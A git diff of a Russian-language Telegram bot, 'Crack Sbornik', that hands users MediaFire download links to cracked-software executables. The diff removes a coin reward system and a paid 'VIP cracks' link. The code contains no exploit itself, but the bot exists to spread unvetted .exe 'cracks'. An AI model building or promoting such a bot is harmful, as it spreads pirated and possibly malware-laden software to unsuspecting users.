@@ -9,7 +9,6 @@ ADMIN_ID = 7859226148  # ⚠️ ЗАМЕНИТЕ НА СВОЙ ID
 
 SOFT_LINK = "https://www.mediafire.com/file/aulm7t7mu6388sc/Crack_Sbornik.exe/file"
 IMAGE_URL = "https://i.ibb.co/KpKqsd8x/gg.png"
-VIP_LINK = "https://www.mediafire.com/file/fh6v3l9v27jh4g7/Crack_Sbornik_VIP.exe/file"
 
 bot = telebot.TeleBot(TOKEN)
 app = Flask(__name__)
@@ -17,50 +16,12 @@ app = Flask(__name__)
 # Данные
 users = set()
 user_last_use = {}
-coins_data = {}
-message_tracker = {}
 blacklist = set()
 waiting_for_report = {}
 download_count = 0
 
 # Файлы
-COINS_FILE = "coins.txt"
-MESSAGES_FILE = "messages.txt"
 BLACKLIST_FILE = "blacklist.txt"
-
-# =============== ФУНКЦИИ СОХРАНЕНИЯ ===============
-def save_coins():
-    with open(COINS_FILE, 'w') as f:
-        for uid, coins in coins_data.items():
-            f.write(f"{uid}|{coins}\n")
-
-def load_coins():
-    global coins_data
-    if os.path.exists(COINS_FILE):
-        with open(COINS_FILE, 'r') as f:
-            for line in f:
-                if '|' in line:
-                    uid, coins = line.strip().split('|')
-                    coins_data[int(uid)] = int(coins)
-
-def save_messages():
-    with open(MESSAGES_FILE, 'w') as f:
-        for uid, data in message_tracker.items():
-            f.write(f"{uid}|{data['count']}|{data.get('name', '')}|{data.get('username', '')}\n")
-
-def load_messages():
-    global message_tracker
-    if os.path.exists(MESSAGES_FILE):
-        with open(MESSAGES_FILE, 'r') as f:
-            for line in f:
-                if line.strip():
-                    parts = line.strip().split('|')
-                    if len(parts) >= 2:
-                        uid = int(parts[0])
-                        count = int(parts[1])
-                        name = parts[2] if len(parts) > 2 else ""
-                        username = parts[3] if len(parts) > 3 else ""
-                        message_tracker[uid] = {"count": count, "name": name, "username": username}
 
 def save_blacklist():
     with open(BLACKLIST_FILE, 'w') as f:
@@ -72,31 +33,6 @@ def load_blacklist():
     if os.path.exists(BLACKLIST_FILE):
         with open(BLACKLIST_FILE, 'r') as f:
             blacklist = set(int(l.strip()) for l in f if l.strip())
-
-# =============== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ===============
-def get_coins(uid):
-    return coins_data.get(uid, 0)
-
-def add_coins(uid, amount):
-    coins_data[uid] = coins_data.get(uid, 0) + amount
-    save_coins()
-
-def remove_coins(uid, amount):
-    if coins_data.get(uid, 0) >= amount:
-        coins_data[uid] = coins_data.get(uid, 0) - amount
-        save_coins()
-        return True
-    return False
-
-def get_messages(uid):
-    return message_tracker.get(uid, {}).get("count", 0)
-
-def add_message(uid, name, username):
-    if uid in message_tracker:
-        message_tracker[uid]["count"] += 1
-    else:
-        message_tracker[uid] = {"count": 1, "name": name, "username": username or ""}
-    save_messages()
 
 def is_banned(uid):
     return uid in blacklist
@@ -123,15 +59,10 @@ def start_command(message):
         return
     
     users.add(uid)
-    add_message(uid, message.from_user.first_name, message.from_user.username)
-    
-    if get_coins(uid) == 0:
-        add_coins(uid, 100)
-        bot.send_message(uid, "🎁 +100 монет за регистрацию!")
     
     cd = check_cd(uid)
     if cd > 0:
-        bot.send_message(uid, f"⏳ Подожди {cd} сек!")
+        bot.send_message(uid, f"⏳ Подожди {cd} секунд!")
         return
     update_cd(uid)
     
@@ -140,9 +71,7 @@ def start_command(message):
     btn2 = types.InlineKeyboardButton("🎯 Подробнее", callback_data="more")
     btn3 = types.InlineKeyboardButton("👥 Поделиться", callback_data="share")
     btn4 = types.InlineKeyboardButton("📢 Репорт", callback_data="report")
-    btn5 = types.InlineKeyboardButton("🌐 Статистика", callback_data="stats")
-    btn6 = types.InlineKeyboardButton("🔝 VIP КРЯКИ", callback_data="vip")
-    kb.add(btn1, btn2, btn3, btn4, btn5, btn6)
+    kb.add(btn1, btn2, btn3, btn4)
     
     bot.send_message(uid, "Crack Sbornik - 💥 лучший сборник кряков именно для тебя!", reply_markup=kb)
 
@@ -161,9 +90,7 @@ def admin_command(message):
         types.InlineKeyboardButton("🖼 Сменить картинку", callback_data="admin_change_image"),
         types.InlineKeyboardButton("🚫 Забанить пользователя", callback_data="admin_ban"),
         types.InlineKeyboardButton("✅ Разбанить пользователя", callback_data="admin_unban"),
-        types.InlineKeyboardButton("📋 Список забаненных", callback_data="admin_banlist"),
-        types.InlineKeyboardButton("📊 Трекер сообщений", callback_data="admin_tracker"),
-        types.InlineKeyboardButton("💰 Управление монетами", callback_data="admin_coins")
+        types.InlineKeyboardButton("📋 Список забаненных", callback_data="admin_banlist")
     )
     bot.send_message(message.chat.id, "🔧 Админ-панель", reply_markup=kb)
 
@@ -175,46 +102,6 @@ def cancel_command(message):
         bot.send_message(uid, "❌ Жалоба отменена")
 
 # =============== КНОПКИ ПОЛЬЗОВАТЕЛЯ ===============
-@bot.callback_query_handler(func=lambda call: call.data == "stats")
-def stats_callback(call):
-    uid = call.from_user.id
-    if is_banned(uid):
-        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
-        return
-    bot.answer_callback_query(call.id)
-    
-    text = f"📊 **Ваша статистика**\n\n"
-    text += f"💰 Монеты: {get_coins(uid)}\n"
-    text += f"💬 Сообщений: {get_messages(uid)}\n"
-    text += f"🆔 ID: {uid}\n"
-    text += f"👤 Имя: {call.from_user.first_name}\n"
-    if call.from_user.username:
-        text += f"📱 Username: @{call.from_user.username}\n"
-    text += f"\n🎁 **Как получить монеты?**\n"
-    text += f"• +5 за сообщение\n• +10 за скачивание\n• +50 за жалобу\n• +100 за регистрацию"
-    bot.send_message(uid, text, parse_mode="Markdown")
-
-@bot.callback_query_handler(func=lambda call: call.data == "vip")
-def vip_callback(call):
-    uid = call.from_user.id
-    if is_banned(uid):
-        bot.answer_callback_query(call.id, "❌ Вы забанены!", True)
-        return
-    
-    cd = check_cd(uid)
-    if cd > 0:
-        bot.answer_callback_query(call.id, f"⏳ {cd} сек!", True)
-        return
-    update_cd(uid)
-    
-    if get_coins(uid) < 1250:
-        bot.answer_callback_query(call.id, f"❌ Нужно 1250 монет! У вас {get_coins(uid)}", True)
-        return
-    
-    remove_coins(uid, 1250)
-    bot.answer_callback_query(call.id, "✅ Снято 1250 монет!", False)
-    bot.send_message(uid, f"🔝 **VIP КРЯКИ**\n\n🔗 {VIP_LINK}\n\n💰 Остаток: {get_coins(uid)}", parse_mode="Markdown")
-
 @bot.callback_query_handler(func=lambda call: call.data == "download")
 def download_callback(call):
     uid = call.from_user.id
@@ -230,9 +117,8 @@ def download_callback(call):
     
     global download_count
     download_count += 1
-    add_coins(uid, 10)
-    bot.answer_callback_query(call.id, "✅ +10 монет!", False)
-    bot.send_message(uid, f"🔗 {SOFT_LINK}")
+    bot.answer_callback_query(call.id, "✅ Ссылка отправлена!", False)
+    bot.send_message(uid, f"🔗 Ссылка для скачивания:\n{SOFT_LINK}")
 
 @bot.callback_query_handler(func=lambda call: call.data == "more")
 def more_callback(call):
@@ -284,11 +170,8 @@ def handle_report_text(m):
     if uid in waiting_for_report:
         del waiting_for_report[uid]
     
-    add_message(uid, m.from_user.first_name, m.from_user.username)
-    add_coins(uid, 50)
-    bot.send_message(uid, "✅ Ваша жалоба отправлена администратору! +50 монет")
+    bot.send_message(uid, "✅ Ваша жалоба отправлена администратору!")
     
-    # Отправляем админу с кнопкой для ответа
     kb = types.InlineKeyboardMarkup()
     kb.add(types.InlineKeyboardButton("💬 Ответить пользователю", callback_data=f"reply_{uid}"))
     bot.send_message(ADMIN_ID, f"📢 **НОВАЯ ЖАЛОБА!**\n\n👤 От: {m.from_user.first_name}\n🆔 ID: `{uid}`\n📱 Username: @{m.from_user.username if m.from_user.username else 'нет'}\n📝 Текст:\n{text}", parse_mode="Markdown", reply_markup=kb)
@@ -372,35 +255,6 @@ def unban_user(m):
     except:
         bot.send_message(m.chat.id, "❌ Ошибка! Введите ID.")
 
-def add_coins_admin(m):
-    try:
-        parts = m.text.strip().split()
-        uid = int(parts[0])
-        amount = int(parts[1])
-        add_coins(uid, amount)
-        bot.send_message(m.chat.id, f"✅ Добавлено {amount} монет. Баланс: {get_coins(uid)}")
-    except:
-        bot.send_message(m.chat.id, "❌ Ошибка! Введите: ID количество")
-
-def remove_coins_admin(m):
-    try:
-        parts = m.text.strip().split()
-        uid = int(parts[0])
-        amount = int(parts[1])
-        if remove_coins(uid, amount):
-            bot.send_message(m.chat.id, f"✅ Убрано {amount} монет. Баланс: {get_coins(uid)}")
-        else:
-            bot.send_message(m.chat.id, f"❌ Недостаточно монет!")
-    except:
-        bot.send_message(m.chat.id, "❌ Ошибка! Введите: ID количество")
-
-def check_coins_admin(m):
-    try:
-        uid = int(m.text.strip())
-        bot.send_message(m.chat.id, f"💰 Баланс пользователя `{uid}`: {get_coins(uid)} монет", parse_mode="Markdown")
-    except:
-        bot.send_message(m.chat.id, "❌ Ошибка! Введите ID")
-
 # =============== АДМИН-КНОПКИ ===============
 @bot.callback_query_handler(func=lambda call: call.data.startswith('admin_'))
 def admin_callback(call):
@@ -441,46 +295,6 @@ def admin_callback(call):
             bot.send_message(call.message.chat.id, f"📋 **Забаненные:**\n\n{lst}", parse_mode="Markdown")
         else:
             bot.send_message(call.message.chat.id, "📋 Чёрный список пуст.")
-    
-    elif call.data == "admin_tracker":
-        if not message_tracker:
-            bot.send_message(call.message.chat.id, "📊 Нет данных.")
-            return
-        sorted_users = sorted(message_tracker.items(), key=lambda x: x[1]["count"], reverse=True)[:20]
-        text = "📊 **Топ по сообщениям:**\n\n"
-        for i, (uid, d) in enumerate(sorted_users, 1):
-            name = d.get('username') or d.get('name', str(uid))[:15]
-            text += f"{i}. {name} — {d['count']}\n"
-        bot.send_message(call.message.chat.id, text, parse_mode="Markdown")
-    
-    elif call.data == "admin_coins":
-        kb = types.InlineKeyboardMarkup(row_width=1)
-        kb.add(
-            types.InlineKeyboardButton("➕ Добавить монеты", callback_data="admin_add_coins"),
-            types.InlineKeyboardButton("➖ Убрать монеты", callback_data="admin_remove_coins"),
-            types.InlineKeyboardButton("🔍 Проверить монеты", callback_data="admin_check_coins"),
-            types.InlineKeyboardButton("🔙 Назад", callback_data="admin_back")
-        )
-        bot.send_message(call.message.chat.id, "💰 **Управление монетами**", parse_mode="Markdown", reply_markup=kb)
-
-@bot.callback_query_handler(func=lambda call: call.data in ["admin_add_coins", "admin_remove_coins", "admin_check_coins", "admin_back"])
-def coins_handlers(call):
-    if not is_admin(call.from_user.id):
-        bot.answer_callback_query(call.id, "❌ Нет доступа!", True)
-        return
-    bot.answer_callback_query(call.id)
-    
-    if call.data == "admin_back":
-        admin_command(call.message)
-    elif call.data == "admin_add_coins":
-        msg = bot.send_message(call.message.chat.id, "➕ Введите: `ID количество`\nПример: `123456789 100`", parse_mode="Markdown")
-        bot.register_next_step_handler(msg, add_coins_admin)
-    elif call.data == "admin_remove_coins":
-        msg = bot.send_message(call.message.chat.id, "➖ Введите: `ID количество`\nПример: `123456789 50`", parse_mode="Markdown")
-        bot.register_next_step_handler(msg, remove_coins_admin)
-    elif call.data == "admin_check_coins":
-        msg = bot.send_message(call.message.chat.id, "🔍 Введите ID пользователя:")
-        bot.register_next_step_handler(msg, check_coins_admin)
 
 # =============== WEBHOOK ===============
 @app.route(f'/{TOKEN}', methods=['POST'])
@@ -495,11 +309,9 @@ def index():
     return "Bot is running!"
 
 if __name__ == "__main__":
-    load_coins()
-    load_messages()
     load_blacklist()
     
-    print(f"✅ Загружено: {len(coins_data)} с монетами, {len(message_tracker)} пользователей, {len(blacklist)} в ЧС")
+    print(f"✅ Загружено: {len(blacklist)} в ЧС")
     
     bot.remove_webhook()
     time.sleep(1)
